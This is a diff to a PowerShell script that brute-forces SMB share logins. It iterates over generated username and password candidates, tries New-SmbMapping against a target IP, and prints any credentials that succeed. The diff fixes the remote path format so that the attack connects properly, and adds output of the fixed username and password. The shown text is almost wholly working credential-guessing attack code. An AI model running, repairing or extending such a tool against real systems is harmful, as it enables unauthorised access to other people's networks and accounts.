@@ -68,6 +68,8 @@ Write-Host "INITIAL MAX LENGTH: " $ml
 Write-Host "MAX LENGTH INCREMENT VALUE: " $mli
 Write-Host "USERNAME CAN NOT CONTAIN: " $uc
 Write-Host "PASSWORD CAN NOT CONTAIN: " $pc
+Write-Host "USERNAME: " $u
+Write-Host "PASSWORD: " $p
 Write-Host "**************************************************************************"
             
 $OldMaxLength = 0
@@ -118,7 +120,7 @@ $Result = $null
 while ($userPtr.Length -le $ml) {
 
     while ($passPtr.Length -le $ml){ #check pass for this user
-        $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
+        $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $user -Password $pass -EA SilentlyContinue
         if ( $Result -ne $null ){
             Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
             Write-Host "**************************************************************************"
@@ -158,7 +160,7 @@ $Result = $null
 
 #Continue till find a match
 :outer while ($true) {
-     $Result = New-SmbMapping -RemotePath $IPAddr -UserName $u -Password $pass -EA SilentlyContinue
+     $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $u -Password $pass -EA SilentlyContinue
      if ( $Result -ne $null ){
         Write-Host "SUCCESS -> User:" $u "PassPtr: " $passPtr "Pass:" $pass
         Write-Host "**************************************************************************"
@@ -181,7 +183,7 @@ $Result = $null
 
 #Continue till find a match
 :outer while ($true) {
-    $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $p -EA SilentlyContinue
+    $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $user -Password $p -EA SilentlyContinue
     if ( $Result -ne $null ){
         Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "Pass:" $p
         Write-Host "**************************************************************************"
@@ -197,7 +199,7 @@ $Result = $null
 }
 
 if ($u -ne $null -and $p -ne $null){
-    $Result = New-SmbMapping -RemotePath $IPAddr -UserName $u -Password $p -EA SilentlyContinue
+    $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $u -Password $p -EA SilentlyContinue
     if ( $Result -ne $null ){
         Write-Host "SUCCESS -> User:" $u "Pass:" $p
     }
